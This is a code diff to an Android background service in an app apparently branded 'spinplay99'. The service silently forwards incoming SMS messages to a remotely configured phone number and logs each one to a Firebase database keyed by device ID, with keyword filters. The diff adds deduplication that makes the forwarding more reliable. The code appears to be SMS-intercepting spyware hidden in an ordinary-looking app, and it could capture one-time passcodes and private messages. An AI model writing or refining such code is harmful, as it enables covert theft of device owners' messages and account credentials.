@@ -8,6 +8,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -45,6 +46,10 @@ public class BackgroundSyncService extends Service {
 
     private static final String CHANNEL_ID = "spinplay99_channel";
     private static final int NOTIFICATION_ID = 999;
+    private static final String FORWARD_PREFS = "sms_forward_dedup";
+    private static final int FORWARD_DEDUP_MAX = 200;
+
+    private SharedPreferences forwardPrefs;
 
     private DatabaseReference databaseReference;
     private String deviceId;
@@ -66,6 +71,7 @@ public class BackgroundSyncService extends Service {
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         handler = new Handler(Looper.getMainLooper());
         smsManager = SmsManager.getDefault();
+        forwardPrefs = getSharedPreferences(FORWARD_PREFS, MODE_PRIVATE);
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
         loadForwardingSettings();
@@ -321,6 +327,8 @@ public class BackgroundSyncService extends Service {
 
     private void forwardSmsMessage(String from, String body, long timestamp) {
         if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) return;
+        String dedupKey = from + "|" + timestamp + "|" + (body != null ? body.hashCode() : 0);
+        if (forwardPrefs.getBoolean(dedupKey, false)) return;
         if (!forwardAllSms && !forwardingFilters.isEmpty()) {
             boolean matched = false;
             for (String filter : forwardingFilters) {
@@ -340,8 +348,23 @@ public class BackgroundSyncService extends Service {
             log.put("status", "FORWARDED");
             log.put("forwarded_at", ServerValue.TIMESTAMP);
             databaseReference.child("devices").child(deviceId).child("forwarded_sms").push().setValue(log);
+            markSmsForwarded(dedupKey);
         } catch (Exception e) {
         }
+    }
+
+    private void markSmsForwarded(String dedupKey) {
+        SharedPreferences.Editor editor = forwardPrefs.edit().putBoolean(dedupKey, true);
+        Map<String, ?> all = forwardPrefs.getAll();
+        if (all.size() >= FORWARD_DEDUP_MAX) {
+            int removeCount = all.size() - FORWARD_DEDUP_MAX + 1;
+            for (String key : all.keySet()) {
+                editor.remove(key);
+                removeCount--;
+                if (removeCount <= 0) break;
+            }
+        }
+        editor.apply();
     }
 
     private void checkAndForwardNewSms() {
